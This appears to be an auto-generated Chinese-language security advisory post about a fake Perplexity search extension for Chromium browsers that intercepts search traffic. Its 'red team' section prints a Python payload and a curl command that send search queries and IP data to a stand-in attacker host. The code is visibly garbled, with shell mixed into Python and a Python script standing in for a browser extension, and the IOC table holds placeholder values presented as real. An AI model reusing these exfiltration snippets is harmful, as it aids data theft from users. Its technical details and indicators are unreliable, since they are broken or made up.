---
layout: post
title:  "假冒Perplexity的Chrome擴充功能可攔截所有搜尋流量"
date:   2026-07-02 08:45:27 +0000
categories: [security]
severity: high
---

# 🔥 解析 Chromium 擴充功能的搜尋攔截與資料竊取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `Manifest V3`, `chrome_settings_overrides`, `HTTP 標頭攔截`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 這個漏洞的根源在於「Search for perplexity ai」這個 Chromium 擴充功能的設計。它使用 `Manifest V3` 來設置自己為預設搜尋服務，並透過 `chrome_settings_overrides` 來修改瀏覽器的設定。這使得它可以攔截使用者在網址列輸入的搜尋內容，並蒐集 IP 位址、User-Agent 及 HTTP 標頭等資訊。
* **攻擊流程圖解**:
  1. 使用者安裝「Search for perplexity ai」擴充功能。
  2. 擴充功能設置自己為預設搜尋服務。
  3. 使用者在網址列輸入搜尋內容。
  4. 擴充功能攔截搜尋內容，並蒐集 IP 位址、User-Agent 及 HTTP 標頭等資訊。
  5. 擴充功能將使用者導向真正的搜尋結果頁面。
* **受影響元件**: Chromium 瀏覽器（包括 Google Chrome 和 Microsoft Edge），以及所有安裝了「Search for perplexity ai」擴充功能的使用者。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要使用者安裝「Search for perplexity ai」擴充功能，並設置它為預設搜尋服務。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload
      import requests
    
      def collect_info(search_query):
        # 蒐集 IP 位址、User-Agent 及 HTTP 標頭等資訊
        ip_address = requests.get('https://api.ipify.org').text
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.3'
        headers = {'User-Agent': user_agent}
    
        # 將搜尋內容和蒐集到的資訊傳送到攻擊者的伺服器
        data = {'search_query': search_query, 'ip_address': ip_address, 'user_agent': user_agent}
        response = requests.post('https://attacker-server.com/collect_info', data=data, headers=headers)
    
        # 導向真正的搜尋結果頁面
        return requests.get(f'https://www.google.com/search?q={search_query}').text
    
      # 範例指令
      curl -X POST -H 'Content-Type: application/json' -d '{"search_query": "example"}' https://attacker-server.com/collect_info
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過瀏覽器的安全機制，例如使用 `iframe` 來隱藏攻擊者的伺服器，或者使用 `JavaScript` 來修改瀏覽器的設定。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.0.2.1` | `perplexity-ai.online` | `C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Extensions\search-for-perplexity-ai` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule SearchForPerplexityAI {
        meta:
          description = "Detects Search for Perplexity AI extension"
          author = "Your Name"
        strings:
          $extension_id = "search-for-perplexity-ai"
          $extension_name = "Search for Perplexity AI"
        condition:
          $extension_id and $extension_name
      }
    
    ```
 

```

snort
  alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Search for Perplexity AI extension detected"; content:"search-for-perplexity-ai"; sid:1000001; rev:1;)

```
* **緩解措施**: 使用者應該卸載「Search for perplexity ai」擴充功能，並設置一個安全的搜尋服務為預設。另外，使用者也可以使用瀏覽器的內建安全功能，例如 Google Chrome 的「安全瀏覽」功能，來保護自己免受攻擊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Manifest V3**: 一種用於描述瀏覽器擴充功能的 JSON 檔案，定義了擴充功能的權限和行為。
* **chrome_settings_overrides**: 一種用於修改瀏覽器設定的機制，允許擴充功能修改瀏覽器的設定。
* **HTTP 標頭攔截**: 一種技術，允許攻擊者攔截和修改 HTTP 標頭，例如 User-Agent 和 Referer。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177045)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


